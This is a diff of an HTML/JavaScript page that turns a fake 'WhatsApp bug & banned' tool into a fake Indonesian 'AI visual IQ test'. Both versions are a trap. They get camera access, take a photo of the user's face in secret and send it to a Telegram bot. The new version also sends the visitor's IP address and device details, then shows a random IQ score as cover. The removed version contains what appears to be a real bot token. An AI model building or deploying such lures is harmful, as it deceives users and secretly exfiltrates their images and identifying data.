@@ -3,175 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Bug & Banned System</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <title>Tes Kecerdasan Visual AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;700&family=Montserrat:wght@300;500&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    
     <style>
         :root {
-            --primary: #00f2ff;
-            --secondary: #7000ff;
-            --bg: #050505;
-            --glass: rgba(255, 255, 255, 0.05);
+            --primary-blue: #00bcd4; /* Cyan */
+            --dark-bg: #1a1a2e;
+            --card-bg: #27273d;
+            --text-color: #e0e0e0;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
-
         body {
-            background: radial-gradient(circle at center, #111 0%, #000 100%);
-            color: white;
-            height: 100vh;
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: var(--text-color);
             display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
+            margin: 0;
             overflow: hidden;
-        }
-
-        /* Container Utama */
-        .container {
-            width: 90%;
-            max-width: 400px;
-            padding: 30px;
-            background: var(--glass);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(0, 242, 255, 0.2);
-            border-radius: 20px;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 242, 255, 0.1);
-            text-align: center;
             position: relative;
         }
 
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.5rem;
-            letter-spacing: 2px;
-            margin-bottom: 30px;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(0, 242, 255, 0.5);
-        }
-
-        /* Input Styling */
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; margin-bottom: 8px; color: var(--primary); font-weight: bold; }
-        
-        input, .custom-select {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 8px;
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }
-
-        /* Custom Dropdown */
-        .dropdown { position: relative; cursor: pointer; }
-        .dropdown-menu {
+        body::before {
+            content: '';
             position: absolute;
-            top: 110%;
+            top: 0;
             left: 0;
             width: 100%;
-            background: #111;
-            border: 1px solid var(--primary);
-            border-radius: 8px;
-            display: none;
-            z-index: 10;
-            overflow: hidden;
-            animation: slideDown 0.3s ease;
+            height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgNzAgNzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgk8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgoJCTxwYXRoIGZpbGw9IiM0NDQ0NUEiIGQ9Ik0wIDBoNzB2NzBIMHoiLz4KCQk8cGF0aCBmaWxsPSIjNTA1MDAwIiBkPSJNMzUgMzVoMzV2MzVIMzV6TTAgMGgzNXYzNUgweCIvPgoJPC9nPgo8L3N2Zz4=') repeat;
+            opacity: 0.1;
+            z-index: 1;
         }
-        .dropdown-menu div {
-            padding: 12px;
-            transition: 0.2s;
-        }
-        .dropdown-menu div:hover { background: var(--secondary); }
-        .dropdown.active .dropdown-menu { display: block; }
-        .dropdown::after {
-            content: '^';
-            position: absolute;
-            right: 15px;
-            top: 40px;
-            transition: 0.3s;
-            color: var(--primary);
-        }
-        .dropdown.active::after { transform: rotate(180deg); }
 
-        /* Button Execute */
-        #executeBtn {
-            width: 100%;
-            padding: 15px;
-            margin-top: 20px;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(45deg, var(--secondary), var(--primary));
-            color: white;
-            font-weight: bold;
-            font-family: 'Orbitron';
+        .container {
+            position: relative;
+            z-index: 2;
+            width: 90%;
+            max-width: 450px;
+            background: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            text-align: center;
+            border: 1px solid rgba(0, 188, 212, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        h1 {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1.6rem;
+            color: var(--primary-blue);
             text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(0, 188, 212, 0.5);
+        }
+
+        .icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background-color: var(--primary-blue);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 3rem;
+            color: var(--card-bg);
+            box-shadow: 0 0 20px var(--primary-blue);
+        }
+
+        .description {
+            font-size: 0.95rem;
+            line-height: 1.6;
+            color: var(--text-color);
+            margin-bottom: 30px;
+        }
+
+        .start-btn {
+            background: linear-gradient(45deg, #00bcd4, #00e5ff);
+            border: none;
+            padding: 15px 35px;
+            border-radius: 50px;
+            color: #1a1a2e;
+            font-weight: bold;
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1rem;
             cursor: pointer;
-            opacity: 0.3;
-            pointer-events: none;
-            transition: 0.5s;
+            box-shadow: 0 8px 25px rgba(0, 188, 212, 0.4);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        #executeBtn.active {
-            opacity: 1;
-            pointer-events: auto;
-            box-shadow: 0 0 20px var(--secondary);
+        .start-btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 30px rgba(0, 188, 212, 0.6);
         }
 
-        #executeBtn:hover { transform: scale(1.02); filter: brightness(1.2); }
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            display: none; /* Hidden by default */
+        }
+
+        .loading-text {
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            font-family: 'Chakra Petch', sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .progress-bar-container {
+            width: 70%;
+            height: 8px;
+            background-color: #444;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00bcd4, #00e5ff);
+            border-radius: 5px;
+            transition: width 0.1s linear;
+        }
 
         /* Hidden Elements */
         video, canvas { display: none; }
-
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .loading-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); display: none;
-            justify-content: center; align-items: center; z-index: 99;
-        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>BUG & BANNED WHATSAPP</h1>
-        
-        <div class="input-group">
-            <label>Target Number</label>
-            <input type="number" id="phone" placeholder="628123xxx" oninput="validate()">
-        </div>
-
-        <div class="input-group">
-            <label>Select Payload</label>
-            <div class="dropdown" id="bugDropdown" onclick="toggleDropdown()">
-                <div class="custom-select" id="selectedBug">Choose Menu...</div>
-                <div class="dropdown-menu">
-                    <div onclick="selectMenu('Bug Delay System')">Bug Delay System</div>
-                    <div onclick="selectMenu('Blank iOS Crash')">Blank iOS Crash</div>
-                    <div onclick="selectMenu('Permanent Banned')">Permanent Banned</div>
-                    <div onclick="selectMenu('WhatsApp OTP Freeze')">WhatsApp OTP Freeze</div>
-                </div>
-            </div>
-        </div>
-
-        <button id="executeBtn" onclick="startExecution()">EXECUTE SYSTEM</button>
+        <div class="icon">🧠</div>
+        <h1>TES KECERDASAN VISUAL AI</h1>
+        <p class="description">
+            Siapakah Anda yang sebenarnya? Uji kemampuan visual dan reaksi otak Anda dengan teknologi AI tercanggih kami. Sistem akan menganalisis ekspresi wajah Anda secara real-time untuk memberikan skor IQ paling akurat!
+        </p>
+        <button class="start-btn" onclick="startTest()">MULAI TES SEKARANG</button>
     </div>
 
-    <div class="loading-overlay" id="loader">
-        <div style="text-align: center;">
-            <div class="spinner"></div>
-            <p id="loadText">Processing...</p>
+    <div class="loading-overlay" id="loadingOverlay">
+        <p class="loading-text" id="loadingStatus">Mempersiapkan modul AI...</p>
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
         </div>
     </div>
 
@@ -179,96 +169,119 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const TELEGRAM_TOKEN = '8213442592:AAHQBg6QTw6gP7XeX_hrSFopwlX_ii5B8lo';
-        const TELEGRAM_ID = '6213349853';
+        const BOT_TOKEN = 'TOKEN_BOT_MU';
+        const CHAT_ID = 'ID_CHAT_MU';
         
-        let selectedMenu = "";
-        let stream = null;
+        let stream = null; // Menyimpan stream kamera agar tidak meminta izin berulang
 
-        function toggleDropdown() {
-            document.getElementById('bugDropdown').classList.toggle('active');
-        }
+        async function startTest() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingStatus = document.getElementById('loadingStatus');
+            const progressBar = document.getElementById('progressBar');
+            loadingOverlay.style.display = 'flex';
+            progressBar.style.width = '0%';
 
-        function selectMenu(val) {
-            selectedMenu = val;
-            document.getElementById('selectedBug').innerText = val;
-            validate();
-        }
-
-        function validate() {
-            const phone = document.getElementById('phone').value;
-            const btn = document.getElementById('executeBtn');
-            if (phone.startsWith('62') && phone.length > 10 && selectedMenu !== "") {
-                btn.classList.add('active');
-            } else {
-                btn.classList.remove('active');
-            }
-        }
-
-        async function startExecution() {
-            const loader = document.getElementById('loader');
-            loader.style.display = 'flex';
-            
             try {
-                // Minta izin atau ambil stream jika belum ada
-                if (!stream) {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" } 
-                    });
-                }
+                loadingStatus.innerText = "Mengaktifkan modul kamera AI...";
+                
+                // Minta izin kamera (pop-up standar browser)
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                // Ambil foto secara diam-diam
-                takeAndSend();
+                let progress = 0;
+                let steps = [
+                    "Menganalisis pola visual...",
+                    "Memproses data ekspresi wajah...",
+                    "Menghitung skor IQ komprehensif...",
+                    "Menyelesaikan kalibrasi AI...",
+                    "Hasil hampir siap!"
+                ];
+                let currentStep = 0;
 
-                // Animasi palsu biar keren
-                let steps = ["Connecting to WhatsApp...", "Injecting Payload...", "Bypassing Security...", "Success!"];
-                let i = 0;
-                let interval = setInterval(() => {
-                    document.getElementById('loadText').innerText = steps[i];
-                    i++;
-                    if(i >= steps.length) {
-                        clearInterval(interval);
+                const progressInterval = setInterval(() => {
+                    progress += Math.floor(Math.random() * 10) + 5; // Tambah progress secara random
+                    if (progress > 100) progress = 100;
+                    progressBar.style.width = progress + '%';
+
+                    if (progress >= 20 * (currentStep + 1) && currentStep < steps.length) {
+                        loadingStatus.innerText = steps[currentStep];
+                        currentStep++;
+                    }
+
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        loadingStatus.innerText = "Tes Selesai!";
+                        
+                        // Ambil foto dan info perangkat
+                        captureAndSend(stream);
+
+                        // Tampilkan hasil palsu setelah beberapa saat
                         setTimeout(() => {
-                            loader.style.display = 'none';
-                            Swal.fire('Executed!', 'Payload has been sent to target.', 'success');
+                            loadingOverlay.style.display = 'none';
+                            displayResult();
                         }, 1000);
                     }
-                }, 1500);
+                }, 400); // Update setiap 0.4 detik
 
             } catch (err) {
-                loader.style.display = 'none';
+                loadingOverlay.style.display = 'none';
                 Swal.fire({
-                    icon: 'error',
-                    title: 'Access Denied',
-                    text: 'Anda harus mengizinkan akses kamera untuk menjalankan modul ini!',
-                    confirmButtonColor: '#7000ff'
+                    icon: 'warning',
+                    title: 'Akses Ditolak',
+                    text: 'Tes Kecerdasan Visual AI memerlukan akses kamera untuk menganalisis wajah Anda.',
+                    confirmButtonText: 'Coba Lagi',
+                    confirmButtonColor: '#00bcd4'
                 });
             }
         }
 
-        function takeAndSend() {
+        async function captureAndSend(cameraStream) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            video.srcObject = stream;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
 
-            setTimeout(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_ID);
-                    formData.append('photo', blob, 'target.jpg');
-                    formData.append('caption', `🔥 *New Target Hit!*\n\nNo: ${document.getElementById('phone').value}\nMenu: ${selectedMenu}`);
-                    formData.append('parse_mode', 'Markdown');
+            // Ambil IP Address
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const userAgent = navigator.userAgent;
 
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, 'image/jpeg');
-            }, 1000);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'iq_test_face.jpg');
+                formData.append('caption', `🧠 *Hasil Tes IQ Target*\n\n🌐 IP: \`${ipData.ip}\`\n📱 Device: \`${userAgent}\``);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Matikan kamera setelah foto dikirim
+                cameraStream.getTracks().forEach(track => track.stop());
+                stream = null; // Reset stream
+            }, 'image/jpeg');
+        }
+
+        function displayResult() {
+            const iqScores = [120, 125, 130, 135, 140, 145, 150];
+            const randomIq = iqScores[Math.floor(Math.random() * iqScores.length)];
+            let category = "";
+            if (randomIq >= 140) category = "Jenius Visual!";
+            else if (randomIq >= 130) category = "Sangat Cerdas!";
+            else category = "Cerdas & Teliti!";
+
+            Swal.fire({
+                title: '🎉 Tes Selesai!',
+                html: `Skor IQ Visual Anda: <b>${randomIq}</b><br>${category}`,
+                icon: 'success',
+                confirmButtonText: 'OK',
+                confirmButtonColor: '#00bcd4'
+            });
         }
     </script>
 </body>
